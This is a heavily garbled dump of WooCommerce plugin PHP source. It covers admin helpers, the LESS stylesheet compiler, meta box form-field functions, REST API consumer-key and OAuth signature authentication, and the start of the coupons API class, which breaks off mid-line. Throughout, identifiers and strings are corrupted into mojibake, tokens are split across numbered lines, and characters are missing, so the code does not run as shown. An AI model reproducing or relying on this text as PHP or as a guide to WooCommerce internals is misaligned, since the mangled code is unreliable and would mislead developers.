Ğ
$·ge_cÚ‹Á
 ) > 0 ) {

63 
	g$·ge_found
 = 
$wpdb
->
g‘_v¬
Ğ$wpdb->
´•¬e
Ğ"SELECT ID FROM " . $wpdb->
po¡s
 . " WHERE…ost_type='page' AND…ost_content LIKE %s LIMIT 1;", "%{$page_content}%" ) );

66 
	g$·ge_found
 = 
$wpdb
->
g‘_v¬
Ğ$wpdb->
´•¬e
Ğ"SELECT ID FROM " . $wpdb->
po¡s
 . " WHERE…o¡_ty³='·ge' AND…o¡_Çmğ% LIMIT 1;", 
$¦ug
 ) );

69 iàĞ
	g$·ge_found
 ) {

70 iàĞ! 
	g$İtiÚ_v®ue
 )

71 
upd©e_İtiÚ
Ğ
$İtiÚ
, 
$·ge_found
 );

73  
	g$·ge_found
;

76 
	g$·ge_d©a
 = 
¬¿y
(

80 'po¡_Çme' => 
$¦ug
,

81 'po¡_t™Ë' => 
$·ge_t™Ë
,

82 'po¡_cÚ‹Á' => 
$·ge_cÚ‹Á
,

83 'po¡_·»Á' => 
$po¡_·»Á
,

86 
	g$·ge_id
 = 
wp_š£¹_po¡
Ğ
$·ge_d©a
 );

88 iàĞ
	g$İtiÚ
 )

89 
upd©e_İtiÚ
Ğ
$İtiÚ
, 
$·ge_id
 );

91  
	g$·ge_id
;

101 
funùiÚ
 
	$woocomm”û_admš_f›lds
Ğ
$İtiÚs
 ) {

102 iàĞ! 
	`şass_exi¡s
( 'WC_Admin_Settings' ) )

103 
šşude
 'class-wc-admin-settings.php';

105 
WC_Admš_S‘tšgs
::
	`ouut_f›lds
Ğ
$İtiÚs
 );

106 
	}
}

115 
funùiÚ
 
	$woocomm”û_upd©e_İtiÚs
Ğ
$İtiÚs
 ) {

116 iàĞ! 
	`şass_exi¡s
( 'WC_Admin_Settings' ) )

117 
šşude
 'class-wc-admin-settings.php';

119 
WC_Admš_S‘tšgs
::
	`§ve_f›lds
Ğ
$İtiÚs
 );

120 
	}
}

128 
funùiÚ
 
woocomm”û_£‰šgs_g‘_İtiÚ
Ğ
$İtiÚ_Çme
, 
$deçuÉ
 = '' ) {

129 iàĞ! 
şass_exi¡s
( 'WC_Admin_Settings' ) )

130 
šşude
 'class-wc-admin-settings.php';

132  
	gWC_Admš_S‘tšgs
::
g‘_İtiÚ
Ğ
$İtiÚ_Çme
, 
$deçuÉ
 );

141 
funùiÚ
 
	$woocomm”û_compe_Ëss_¡yËs
() {

142 
glob®
 
$woocomm”û
;

144 
$cŞÜs
 = 
	`¬¿y_m­
Ğ'esc_©Œ', (
¬¿y
è
	`g‘_İtiÚ
( 'woocommerce_frontend_css_colors' ) );

145 
$ba£_fe
 = 
	`WC
()->
	`¶ugš_·th
() . '/assets/css/woocommerce-base.less';

146 
$Ëss_fe
 = 
	`WC
()->
	`¶ugš_·th
() . '/assets/css/woocommerce.less';

147 
$css_fe
 = 
	`WC
()->
	`¶ugš_·th
() . '/assets/css/woocommerce.css';

150 iàĞ
	`is_wr™abË
Ğ
$ba£_fe
 ) && is_wr™abËĞ
$css_fe
 ) ) {

153 iàĞ! 
	`şass_exi¡s
( 'lessc' ) )

154 
	`šşude_Úû
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/libraries/class-lessc.php' );

155 iàĞ! 
	`şass_exi¡s
( 'cssmin' ) )

156 
	`šşude_Úû
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/libraries/class-cssmin.php' );

158 
Œy
 {

160 iàĞ! 
$cŞÜs
['primary'] ) $colors['primary'] = '#ad74a2';

161 iàĞ! 
$cŞÜs
['secondary'] ) $colors['secondary'] = '#f7f6f7';

162 iàĞ! 
$cŞÜs
['highlight'] ) $colors['highlight'] = '#85ad74';

163 iàĞ! 
$cŞÜs
['content_bg'] ) $colors['content_bg'] = '#ffffff';

164 iàĞ! 
$cŞÜs
['subtext'] ) $colors['subtext'] = '#777777';

167 
$cŞÜ_ruËs
 = "

168 @
´im¬y
: " . $colors['primary'] . ";

169 @
´im¬y‹xt
: " . wc_light_or_dark( $colors['primary'], 'desaturate(darken(@primary,50%),18%)', 'desaturate(lighten(@primary,50%),18%)' ) . ";

171 @
£cÚd¬y
: " . $colors['secondary'] . ";

172 @
£cÚd¬y‹xt
: " . wc_light_or_dark( $colors['secondary'], 'desaturate(darken(@secondary,60%),18%)', 'desaturate(lighten(@secondary,60%),18%)' ) . ";

174 @
highlight
: " . $colors['highlight'] . ";

175 @
highligh‹xt
: " . wc_light_or_dark( $colors['highlight'], 'desaturate(darken(@highlight,60%),18%)', 'desaturate(lighten(@highlight,60%),18%)' ) . ";

177 @
cÚ‹Ábg
: " . $colors['content_bg'] . ";

179 @
sub‹xt
: " . $colors['subtext'] . ";

182 
	`fe_put_cÚ‹Ás
Ğ
$ba£_fe
, 
$cŞÜ_ruËs
 );

184 
$Ëss
 = 
Ãw
 
Ëssc
;

185 
$comped_css
 = 
$Ëss
->
	`compeFe
Ğ
$Ëss_fe
 );

186 
$comped_css
 = 
CssMš
::
	`mšify
( $compiled_css );

188 iàĞ
$comped_css
 )

189 
	`fe_put_cÚ‹Ás
Ğ
$css_fe
, 
$comped_css
 );

191 } 
	`ÿtch
 ( 
exû±iÚ
 
$ex
 ) {

192 
	`wp_d›
Ğ
	`__
Ğ'Could‚Ù compwoocomm”û.Ëss:', 'woocomm”û' ) . ' ' . 
$ex
->
	`g‘Mes§ge
() );

195 
	}
}

	@includes/admin/wc-meta-box-functions.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

20 
funùiÚ
 
	$woocomm”û_wp_‹xt_šput
Ğ
$f›ld
 ) {

21 
glob®
 
$th•o¡id
, 
$po¡
, 
$woocomm”û
;

23 
$th•o¡id
 = 
	`em±y
Ğ$th•o¡id ) ? 
$po¡
->
ID
 : $thepostid;

24 
$f›ld
['¶aûhŞd”'] = 
	`is£t
( $field['placeholder'] ) ? $field['placeholder'] : '';

25 
$f›ld
['şass'] = 
	`is£t
( $field['class'] ) ? $field['class'] : 'short';

26 
$f›ld
['w¿µ”_şass'] = 
	`is£t
( $field['wrapper_class'] ) ? $field['wrapper_class'] : '';

27 
$f›ld
['v®ue'] = 
	`is£t
Ğ$f›ld['v®ue'] ) ? $f›ld['v®ue'] : 
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, $f›ld['id'], 
Œue
 );

28 
$f›ld
['Çme'] = 
	`is£t
( $field['name'] ) ? $field['name'] : $field['id'];

29 
$f›ld
['ty³'] = 
	`is£t
( $field['type'] ) ? $field['type'] : 'text';

30 
$d©a_ty³
 = 
	`em±y
Ğ
$f›ld
['data_type'] ) ? '' : $field['data_type'];

32  
$d©a_ty³
 ) {

34 
$f›ld
['class'] .= ' wc_input_price';

35 
$f›ld
['v®ue'] = 
	`wc_fÜm©_loÿlized_´iû
( $field['value'] );

38 
$f›ld
['class'] .= ' wc_input_decimal';

39 
$f›ld
['v®ue'] = 
	`wc_fÜm©_loÿlized_decim®
( $field['value'] );

44 
$cu¡om_©Œibu‹s
 = 
	`¬¿y
();

46 iàĞ! 
	`em±y
Ğ
$f›ld
['cu¡om_©Œibu‹s'] ) && 
	`is_¬¿y
( $field['custom_attributes'] ) )

47 
	`fÜ—ch
 ( 
$f›ld
['cu¡om_©Œibu‹s'] 
as
 
$©Œibu‹
 => 
$v®ue
 )

48 
$cu¡om_©Œibu‹s
[] = 
	`esc_©Œ
Ğ
$©Œibu‹
 ) . '="' .ƒsc_©ŒĞ
$v®ue
 ) . '"';

50 
echo
 '<°şass="fÜm-f›ld ' . 
	`esc_©Œ
Ğ
$f›ld
['id'] ) . '_f›ld ' .ƒsc_©ŒĞ$f›ld['w¿µ”_şass'] ) . '"><Ïb– fÜ="' .ƒsc_©ŒĞ$f›ld['id'] ) . '">' . 
	`wp_k£s_po¡
Ğ$f›ld['Ïb–'] ) . '</Ïb–><špuˆty³="' .ƒsc_©ŒĞ$f›ld['ty³'] ) . '" cÏss="' .ƒsc_©ŒĞ$f›ld['şass'] ) . '"‚ame="' .ƒsc_©ŒĞ$f›ld['Çme'] ) . '" id="' .ƒsc_©ŒĞ$f›ld['id'] ) . '" v®ue="' .ƒsc_©ŒĞ$f›ld['v®ue'] ) . '"…ÏûhŞd”="' .ƒsc_©ŒĞ$f›ld['¶aûhŞd”'] ) . '" ' . 
	`im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ) . ' /> ';

52 iàĞ! 
	`em±y
Ğ
$f›ld
['description'] ) ) {

54 iàĞ
	`is£t
Ğ
$f›ld
['desc_t'] ) && 
çl£
 !== $field['desc_tip'] ) {

55 
echo
 '<img cÏss="h–p_t" d©a-t="' . 
	`esc_©Œ
Ğ
$f›ld
['desütiÚ'] ) . '" src="' . 
	`esc_u¾
Ğ
	`WC
()->
	`¶ugš_u¾
() ) . '/assets/images/help.png" height="16" width="16" />';

57 
echo
 '<¥ª cÏss="desütiÚ">' . 
	`wp_k£s_po¡
Ğ
$f›ld
['description'] ) . '</span>';

61 
echo
 '</p>';

62 
	}
}

71 
funùiÚ
 
	$woocomm”û_wp_hidd’_šput
Ğ
$f›ld
 ) {

72 
glob®
 
$th•o¡id
, 
$po¡
;

74 
$th•o¡id
 = 
	`em±y
Ğ$th•o¡id ) ? 
$po¡
->
ID
 : $thepostid;

75 
$f›ld
['v®ue'] = 
	`is£t
Ğ$f›ld['v®ue'] ) ? $f›ld['v®ue'] : 
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, $f›ld['id'], 
Œue
 );

76 
$f›ld
['şass'] = 
	`is£t
( $field['class'] ) ? $field['class'] : '';

78 
echo
 '<špuˆty³="hidd’" cÏss="' . 
	`esc_©Œ
Ğ
$f›ld
['class'] ) . '"‚ame="' .ƒsc_attr( $field['id'] ) . '" id="' .ƒsc_attr( $field['id'] ) . '" value="' .ƒsc_attr( $field['value'] ) . '" /> ';

79 
	}
}

88 
funùiÚ
 
	$woocomm”û_wp_‹x»a_šput
Ğ
$f›ld
 ) {

89 
glob®
 
$th•o¡id
, 
$po¡
, 
$woocomm”û
;

91 
$th•o¡id
 = 
	`em±y
Ğ$th•o¡id ) ? 
$po¡
->
ID
 : $thepostid;

92 
$f›ld
['¶aûhŞd”'] = 
	`is£t
( $field['placeholder'] ) ? $field['placeholder'] : '';

93 
$f›ld
['şass'] = 
	`is£t
( $field['class'] ) ? $field['class'] : 'short';

94 
$f›ld
['w¿µ”_şass'] = 
	`is£t
( $field['wrapper_class'] ) ? $field['wrapper_class'] : '';

95 
$f›ld
['v®ue'] = 
	`is£t
Ğ$f›ld['v®ue'] ) ? $f›ld['v®ue'] : 
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, $f›ld['id'], 
Œue
 );

97 
echo
 '<°şass="fÜm-f›ld ' . 
	`esc_©Œ
Ğ
$f›ld
['id'] ) . '_f›ld ' .ƒsc_©ŒĞ$f›ld['w¿µ”_şass'] ) . '"><Ïb– fÜ="' .ƒsc_©ŒĞ$f›ld['id'] ) . '">' . 
	`wp_k£s_po¡
Ğ$f›ld['Ïb–'] ) . '</Ïb–><‹x»¨şass="' .ƒsc_©ŒĞ$f›ld['şass'] ) . '"‚ame="' .ƒsc_©ŒĞ$f›ld['id'] ) . '" id="' .ƒsc_©ŒĞ$f›ld['id'] ) . '"…ÏûhŞd”="' .ƒsc_©ŒĞ$f›ld['¶aûhŞd”'] ) . '"„ows="2" cŞs="20">' . 
	`esc_‹x»a
( $field['value'] ) . '</textarea> ';

99 iàĞ! 
	`em±y
Ğ
$f›ld
['description'] ) ) {

101 iàĞ
	`is£t
Ğ
$f›ld
['desc_t'] ) && 
çl£
 !== $field['desc_tip'] ) {

102 
echo
 '<img cÏss="h–p_t" d©a-t="' . 
	`esc_©Œ
Ğ
$f›ld
['desütiÚ'] ) . '" src="' . 
	`esc_u¾
Ğ
	`WC
()->
	`¶ugš_u¾
() ) . '/assets/images/help.png" height="16" width="16" />';

104 
echo
 '<¥ª cÏss="desütiÚ">' . 
	`wp_k£s_po¡
Ğ
$f›ld
['description'] ) . '</span>';

108 
echo
 '</p>';

109 
	}
}

118 
funùiÚ
 
	$woocomm”û_wp_checkbox
Ğ
$f›ld
 ) {

119 
glob®
 
$th•o¡id
, 
$po¡
;

121 
$th•o¡id
 = 
	`em±y
Ğ$th•o¡id ) ? 
$po¡
->
ID
 : $thepostid;

122 
$f›ld
['şass'] = 
	`is£t
( $field['class'] ) ? $field['class'] : 'checkbox';

123 
$f›ld
['w¿µ”_şass'] = 
	`is£t
( $field['wrapper_class'] ) ? $field['wrapper_class'] : '';

124 
$f›ld
['v®ue'] = 
	`is£t
Ğ$f›ld['v®ue'] ) ? $f›ld['v®ue'] : 
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, $f›ld['id'], 
Œue
 );

125 
$f›ld
['cbv®ue'] = 
	`is£t
( $field['cbvalue'] ) ? $field['cbvalue'] : 'yes';

126 
$f›ld
['Çme'] = 
	`is£t
( $field['name'] ) ? $field['name'] : $field['id'];

128 
echo
 '<°şass="fÜm-f›ld ' . 
	`esc_©Œ
Ğ
$f›ld
['id'] ) . '_f›ld ' .ƒsc_©ŒĞ$f›ld['w¿µ”_şass'] ) . '"><Ïb– fÜ="' .ƒsc_©ŒĞ$f›ld['id'] ) . '">' . 
	`wp_k£s_po¡
Ğ$f›ld['Ïb–'] ) . '</Ïb–><špuˆty³="checkbox" cÏss="' .ƒsc_©ŒĞ$f›ld['şass'] ) . '"‚ame="' .ƒsc_©ŒĞ$f›ld['Çme'] ) . '" id="' .ƒsc_©ŒĞ$f›ld['id'] ) . '" v®ue="' .ƒsc_©ŒĞ$f›ld['cbv®ue'] ) . '" ' . 
	`checked
Ğ$f›ld['v®ue'], $f›ld['cbv®ue'], 
çl£
 ) . ' /> ';

130 iàĞ! 
	`em±y
Ğ
$f›ld
['desütiÚ'] ) ) 
echo
 '<¥ª cÏss="desütiÚ">' . 
	`wp_k£s_po¡
( $field['description'] ) . '</span>';

132 
echo
 '</p>';

133 
	}
}

142 
funùiÚ
 
	$woocomm”û_wp_£Ëù
Ğ
$f›ld
 ) {

143 
glob®
 
$th•o¡id
, 
$po¡
, 
$woocomm”û
;

145 
$th•o¡id
 = 
	`em±y
Ğ$th•o¡id ) ? 
$po¡
->
ID
 : $thepostid;

146 
$f›ld
['şass'] = 
	`is£t
( $field['class'] ) ? $field['class'] : 'select short';

147 
$f›ld
['w¿µ”_şass'] = 
	`is£t
( $field['wrapper_class'] ) ? $field['wrapper_class'] : '';

148 
$f›ld
['v®ue'] = 
	`is£t
Ğ$f›ld['v®ue'] ) ? $f›ld['v®ue'] : 
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, $f›ld['id'], 
Œue
 );

150 
echo
 '<°şass="fÜm-f›ld ' . 
	`esc_©Œ
Ğ
$f›ld
['id'] ) . '_f›ld ' .ƒsc_©ŒĞ$f›ld['w¿µ”_şass'] ) . '"><Ïb– fÜ="' .ƒsc_©ŒĞ$f›ld['id'] ) . '">' . 
	`wp_k£s_po¡
( $field['label'] ) . '</label><select id="' .ƒsc_attr( $field['id'] ) . '"‚ame="' .ƒsc_attr( $field['id'] ) . '" class="' .ƒsc_attr( $field['class'] ) . '">';

152 
	`fÜ—ch
 ( 
$f›ld
['İtiÚs'] 
as
 
$key
 => 
$v®ue
 ) {

154 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$key
 ) . '" ' . 
	`£Ëùed
Ğesc_©ŒĞ
$f›ld
['v®ue'] ),ƒsc_©ŒĞ$key ), 
çl£
 ) . '>' . 
	`esc_html
Ğ
$v®ue
 ) . '</option>';

158 
echo
 '</select> ';

160 iàĞ! 
	`em±y
Ğ
$f›ld
['description'] ) ) {

162 iàĞ
	`is£t
Ğ
$f›ld
['desc_t'] ) && 
çl£
 !== $field['desc_tip'] ) {

163 
echo
 '<img cÏss="h–p_t" d©a-t="' . 
	`esc_©Œ
Ğ
$f›ld
['desütiÚ'] ) . '" src="' . 
	`esc_u¾
Ğ
	`WC
()->
	`¶ugš_u¾
() ) . '/assets/images/help.png" height="16" width="16" />';

165 
echo
 '<¥ª cÏss="desütiÚ">' . 
	`wp_k£s_po¡
Ğ
$f›ld
['description'] ) . '</span>';

169 
echo
 '</p>';

170 
	}
}

179 
funùiÚ
 
	$woocomm”û_wp_¿dio
Ğ
$f›ld
 ) {

180 
glob®
 
$th•o¡id
, 
$po¡
, 
$woocomm”û
;

182 
$th•o¡id
 = 
	`em±y
Ğ$th•o¡id ) ? 
$po¡
->
ID
 : $thepostid;

183 
$f›ld
['şass'] = 
	`is£t
( $field['class'] ) ? $field['class'] : 'select short';

184 
$f›ld
['w¿µ”_şass'] = 
	`is£t
( $field['wrapper_class'] ) ? $field['wrapper_class'] : '';

185 
$f›ld
['v®ue'] = 
	`is£t
Ğ$f›ld['v®ue'] ) ? $f›ld['v®ue'] : 
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, $f›ld['id'], 
Œue
 );

186 
$f›ld
['Çme'] = 
	`is£t
( $field['name'] ) ? $field['name'] : $field['id'];

188 
echo
 '<f›ld£ˆşass="fÜm-f›ld ' . 
	`esc_©Œ
Ğ
$f›ld
['id'] ) . '_f›ld ' .ƒsc_©ŒĞ$f›ld['w¿µ”_şass'] ) . '"><Ëg’d>' . 
	`wp_k£s_po¡
( $field['label'] ) . '</legend><ul class="wc-radios">';

190 
	`fÜ—ch
 ( 
$f›ld
['İtiÚs'] 
as
 
$key
 => 
$v®ue
 ) {

192 
echo
 '<li><label><input

193 
Çme
="' .ƒsc_attr( $field['name'] ) . '"

194 
v®ue
="' .ƒsc_attr( $key ) . '"

195 
ty³
="radio"

196 
şass
="' .ƒsc_attr( $field['class'] ) . '"

197 ' . checkedĞesc_©ŒĞ$f›ld['
v®ue
'] ),ƒsc_attr( $key ), false ) . '

198 /> ' .ƒsc_htmlĞ$v®uè. '</
Ïb–
>

199 </
li
>';

201 
echo
 '</ul>';

203 iàĞ! 
	`em±y
Ğ
$f›ld
['description'] ) ) {

205 iàĞ
	`is£t
Ğ
$f›ld
['desc_t'] ) && 
çl£
 !== $field['desc_tip'] ) {

206 
echo
 '<img cÏss="h–p_t" d©a-t="' . 
	`esc_©Œ
Ğ
$f›ld
['desütiÚ'] ) . '" src="' . 
	`esc_u¾
Ğ
	`WC
()->
	`¶ugš_u¾
() ) . '/assets/images/help.png" height="16" width="16" />';

208 
echo
 '<¥ª cÏss="desütiÚ">' . 
	`wp_k£s_po¡
Ğ
$f›ld
['description'] ) . '</span>';

213 
echo
 '</fieldset>';

214 
	}
}

	@includes/api/class-wc-api-authentication.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 şas 
	cWC_API_Auth’tiÿtiÚ
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_f‹r
Ğ'woocomm”û_­i_check_auth’tiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'authenticate' ), 0 );

34 
public
 
funùiÚ
 
	$auth’tiÿ‹
Ğ
$u£r
 ) {

37 iàĞ'/' ==ğ
	`WC
()->
­i
->
£rv”
->
·th
 )

38  
Ãw
 
	`WP_U£r
(0);

40 
Œy
 {

42 iàĞ
	`is_s¦
() )

43 
$u£r
 = 
$this
->
	`³rfÜm_s¦_auth’tiÿtiÚ
();

45 
$u£r
 = 
$this
->
	`³rfÜm_ßuth_auth’tiÿtiÚ
();

48 
$this
->
	`check_­i_key_³rmissiÚs
Ğ
$u£r
 );

50 } 
	`ÿtch
 ( 
Exû±iÚ
 
$e
 ) {

52 
$u£r
 = 
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_auth’tiÿtiÚ_”rÜ', 
$e
->
	`g‘Mes§ge
(), 
	`¬¿y
Ğ'¡©us' => $e->
	`g‘Code
() ) );

55  
$u£r
;

56 
	}
}

68 
´iv©e
 
funùiÚ
 
	$³rfÜm_s¦_auth’tiÿtiÚ
() {

70 
$·¿ms
 = 
	`WC
()->
­i
->
£rv”
->
·¿ms
['GET'];

73 iàĞ! 
	`em±y
Ğ
$_SERVER
['PHP_AUTH_USER'] ) ) {

76 
$cÚsum”_key
 = 
$_SERVER
['PHP_AUTH_USER'];

78 } 
	`–£if
 ( ! 
	`em±y
Ğ
$·¿ms
['consumer_key'] ) ) {

81 
$cÚsum”_key
 = 
$·¿ms
['consumer_key'];

85 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Consumer Key is missing', 'woocommerce' ), 404 );

89 iàĞ! 
	`em±y
Ğ
$_SERVER
['PHP_AUTH_PW'] ) ) {

92 
$cÚsum”_£ü‘
 = 
$_SERVER
['PHP_AUTH_PW'];

94 } 
	`–£if
 ( ! 
	`em±y
Ğ
$·¿ms
['consumer_secret'] ) ) {

97 
$cÚsum”_£ü‘
 = 
$·¿ms
['consumer_secret'];

101 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Consumer Secret is missing', 'woocommerce' ), 404 );

104 
$u£r
 = 
$this
->
	`g‘_u£r_by_cÚsum”_key
Ğ
$cÚsum”_key
 );

106 iàĞ! 
$this
->
	`is_cÚsum”_£ü‘_v®id
Ğ
$u£r
, 
$cÚsum”_£ü‘
 ) ) {

107 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Consumer Secret is invalid', 'woocommerce' ), 401 );

110  
$u£r
;

111 
	}
}

130 
´iv©e
 
funùiÚ
 
	$³rfÜm_ßuth_auth’tiÿtiÚ
() {

132 
$·¿ms
 = 
	`WC
()->
­i
->
£rv”
->
·¿ms
['GET'];

134 
$·¿m_Çmes
 = 
	`¬¿y
( 'oauth_consumer_key', 'oauth_timestamp', 'oauth_nonce', 'oauth_signature', 'oauth_signature_method' );

137 
	`fÜ—ch
 ( 
$·¿m_Çmes
 
as
 
$·¿m_Çme
 ) {

139 iàĞ
	`em±y
Ğ
$·¿ms
[ 
$·¿m_Çme
 ] ) )

140 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`¥rštf
Ğ
	`__
Ğ'% ·¿m‘” i missšg', 'woocomm”û' ), 
$·¿m_Çme
 ), 404 );

144 
$u£r
 = 
$this
->
	`g‘_u£r_by_cÚsum”_key
Ğ
$·¿ms
['oauth_consumer_key'] );

147 
$this
->
	`check_ßuth_sigÇtu»
Ğ
$u£r
, 
$·¿ms
 );

148 
$this
->
	`check_ßuth_time¡amp_ªd_nÚû
Ğ
$u£r
, 
$·¿ms
['oauth_timestamp'], $params['oauth_nonce'] );

151  
$u£r
;

152 
	}
}

162 
´iv©e
 
funùiÚ
 
	$g‘_u£r_by_cÚsum”_key
Ğ
$cÚsum”_key
 ) {

164 
$u£r_qu”y
 = 
Ãw
 
	`WP_U£r_Qu”y
(

165 
	`¬¿y
(

167 'm‘a_v®ue' => 
$cÚsum”_key
,

171 
$u£rs
 = 
$u£r_qu”y
->
	`g‘_»suÉs
();

173 iàĞ
	`em±y
Ğ
$u£rs
[0] ) )

174 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Consumer Key is invalid', 'woocommerce' ), 401 );

176  
$u£rs
[0];

177 
	}
}

187 
´iv©e
 
funùiÚ
 
	$is_cÚsum”_£ü‘_v®id
Ğ
WP_U£r
 
$u£r
, 
$cÚsum”_£ü‘
 ) {

189  
$u£r
->
woocomm”û_­i_cÚsum”_£ü‘
 ==ğ
$cÚsum”_£ü‘
;

190 
	}
}

200 
´iv©e
 
funùiÚ
 
	$check_ßuth_sigÇtu»
Ğ
$u£r
, 
$·¿ms
 ) {

202 
$h‰p_m‘hod
 = 
	`¡¹ouµ”
Ğ
	`WC
()->
­i
->
£rv”
->
m‘hod
 );

204 
$ba£_»que¡_uri
 = 
	`¿wu¾’code
Ğ
	`uÁ¿šg¦ash™
Ğ
	`g‘_woocomm”û_­i_u¾
Ğ'' ) ) . 
	`WC
()->
­i
->
£rv”
->
·th
 );

207 
$cÚsum”_sigÇtu»
 = 
	`¿wu¾decode
Ğ
$·¿ms
['oauth_signature'] );

208 
	`un£t
Ğ
$·¿ms
['oauth_signature'] );

211 iàĞ
	`is£t
Ğ
$·¿ms
['filter'] ) ) {

212 
$f‹rs
 = 
$·¿ms
['filter'];

213 
	`un£t
Ğ
$·¿ms
['filter'] );

214 
	`fÜ—ch
 ( 
$f‹rs
 
as
 
$f‹r
 => 
$f‹r_v®ue
 ) {

215 
$·¿ms
['f‹r[' . 
$f‹r
 . ']'] = 
$f‹r_v®ue
;

220 
$·¿ms
 = 
$this
->
	`nÜm®ize_·¿m‘”s
( $params );

223 iàĞ! 
	`uksÜt
Ğ
$·¿ms
, 'strcmp' ) ) {

224 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Invalid Signature - failedo sort…arameters', 'woocommerce' ), 401 );

228 
$qu”y_·¿ms
 = 
	`¬¿y
();

229 
	`fÜ—ch
 ( 
$·¿ms
 
as
 
$·¿m_key
 => 
$·¿m_v®ue
 ) {

231 
$qu”y_·¿ms
[] = 
$·¿m_key
 . '%3D' . 
$·¿m_v®ue
;

233 
$qu”y_¡ršg
 = 
	`im¶ode
Ğ'%26', 
$qu”y_·¿ms
 );

235 
$¡ršg_to_sign
 = 
$h‰p_m‘hod
 . '&' . 
$ba£_»que¡_uri
 . '&' . 
$qu”y_¡ršg
;

237 iàĞ
$·¿ms
['oauth_signature_method'] !== 'HMAC-SHA1' && $params['oauth_signature_method'] !== 'HMAC-SHA256' ) {

238 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Invalid Signature - signature method is invalid', 'woocommerce' ), 401 );

241 
$hash_®gÜ™hm
 = 
	`¡¹Şow”
Ğ
	`¡r_»¶aû
Ğ'HMAC-', '', 
$·¿ms
['oauth_signature_method'] ) );

243 
$sigÇtu»
 = 
	`ba£64_’code
Ğ
	`hash_hmac
Ğ
$hash_®gÜ™hm
, 
$¡ršg_to_sign
, 
$u£r
->
woocomm”û_­i_cÚsum”_£ü‘
, 
Œue
 ) );

245 iàĞ
$sigÇtu»
 !=ğ
$cÚsum”_sigÇtu»
 ) {

246 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Invalid Signature -…rovided signature does‚ot match', 'woocommerce' ), 401 );

248 
	}
}

270 
´iv©e
 
funùiÚ
 
	$nÜm®ize_·¿m‘”s
Ğ
$·¿m‘”s
 ) {

272 
$nÜm®ized_·¿m‘”s
 = 
	`¬¿y
();

274 
	`fÜ—ch
 ( 
$·¿m‘”s
 
as
 
$key
 => 
$v®ue
 ) {

277 
$key
 = 
	`¡r_»¶aû
Ğ'%', '%25', 
	`¿wu¾’code
Ğ
	`¿wu¾decode
( $key ) ) );

278 
$v®ue
 = 
	`¡r_»¶aû
Ğ'%', '%25', 
	`¿wu¾’code
Ğ
	`¿wu¾decode
( $value ) ) );

280 
$nÜm®ized_·¿m‘”s
[ 
$key
 ] = 
$v®ue
;

283  
$nÜm®ized_·¿m‘”s
;

284 
	}
}

298 
´iv©e
 
funùiÚ
 
	$check_ßuth_time¡amp_ªd_nÚû
Ğ
$u£r
, 
$time¡amp
, 
$nÚû
 ) {

300 
$v®id_wšdow
 = 15 * 60;

302 iàĞĞ
$time¡amp
 < 
	`time
(è- 
$v®id_wšdow
 ) || ( $timestamp >ime() + $valid_window ) )

303 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Invalidimestamp', 'woocommerce' ) );

305 
$u£d_nÚûs
 = 
$u£r
->
woocomm”û_­i_nÚûs
;

307 iàĞ
	`em±y
Ğ
$u£d_nÚûs
 ) )

308 
$u£d_nÚûs
 = 
	`¬¿y
();

310 iàĞ
	`š_¬¿y
Ğ
$nÚû
, 
$u£d_nÚûs
 ) )

311 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Invalid‚once -‚once has‡lready been used', 'woocommerce' ), 401 );

313 
$u£d_nÚûs
[ 
$time¡amp
 ] = 
$nÚû
;

316 
	`fÜ—ch
Ğ
$u£d_nÚûs
 
as
 
$nÚû_time¡amp
 => 
$nÚû
 ) {

318 iàĞ
$nÚû_time¡amp
 < ( 
	`time
(è- 
$v®id_wšdow
 ) )

319 
	`un£t
Ğ
$u£d_nÚûs
[ 
$nÚû_time¡amp
 ] );

322 
	`upd©e_u£r_m‘a
Ğ
$u£r
->
ID
, 'woocomm”û_­i_nÚûs', 
$u£d_nÚûs
 );

323 
	}
}

331 
public
 
funùiÚ
 
	$check_­i_key_³rmissiÚs
Ğ
$u£r
 ) {

333 
$key_³rmissiÚs
 = 
$u£r
->
woocomm”û_­i_key_³rmissiÚs
;

335  
	`WC
()->
­i
->
£rv”
->
m‘hod
 ) {

339 iàĞ'»ad' !=ğ
$key_³rmissiÚs
 && 'read_write' !== $key_permissions ) {

340 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'The API key…rovided does‚ot have„ead…ermissions', 'woocommerce' ), 401 );

348 iàĞ'wr™e' !=ğ
$key_³rmissiÚs
 && 'read_write' !== $key_permissions ) {

349 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'The API key…rovided does‚ot have write…ermissions', 'woocommerce' ), 401 );

353 
	}
}

	@includes/api/class-wc-api-coupons.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_API_CoupÚs
 
ex‹nds
 
	mWC_API_Resourû
 {

19 
´Ùeùed
 
	m$ba£
 = '/coupons';

32 
public
 
funùiÚ
 
	$»gi¡”_rou‹s
Ğ
$rou‹s
 ) {

34 #GET /
coupÚs


35 
$rou‹s
[ 
$this
->
ba£
 ] = 
	`¬¿y
(

36 
	`¬¿y
Ğ¬¿yĞ
$this
